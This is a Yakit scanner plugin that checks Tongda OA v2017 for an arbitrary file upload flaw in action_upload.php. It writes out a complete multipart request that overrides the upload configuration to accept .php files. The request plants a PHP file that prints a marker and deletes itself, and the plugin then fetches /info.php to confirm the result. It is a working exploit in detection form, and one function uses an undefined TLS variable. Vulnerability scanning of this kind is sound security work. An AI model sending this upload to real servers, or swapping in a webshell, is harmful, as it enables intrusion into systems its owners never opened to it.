script_name: 通达OA v2017 action_upload.php 任意文件上传漏洞检测
content:
# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Length: 893
Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
X_requested_with: XMLHttpRequest
Accept-Encoding: gzip

-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

info
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php echo ("hello--yakit");@unlink(__FILE__);?>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--`
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if !str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) {
        return
    }
    

}

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /info.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAllOfSubString(rsp, `hello--yakit`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v 通达OA v2017 action_upload.php 任意文件上传漏洞", addr)
            risk.NewRisk(
            addr,risk.title("通达OA v2017 action_upload.php 任意文件上传漏洞"),
            risk.severity("high"),
            risk.titleVerbose("通达OA v2017 action_upload.php 任意文件上传漏洞存在"),
            risk.type("RCE[通达OA v2017]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在通达OA v2017 action_upload.php 任意文件上传漏洞")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    println(result)

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port)
    }
    
}
